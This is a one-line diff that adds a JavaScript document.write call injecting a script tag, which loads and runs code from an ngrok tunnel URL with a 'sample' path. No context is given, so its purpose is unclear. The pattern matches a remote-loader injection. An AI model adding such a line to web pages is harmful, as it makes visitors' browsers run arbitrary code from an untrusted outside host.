@@ -1,0 +1,1 @@
+document.write('<script src="https://17afee27.ngrok.com/v1/sample/8/js"></script>');
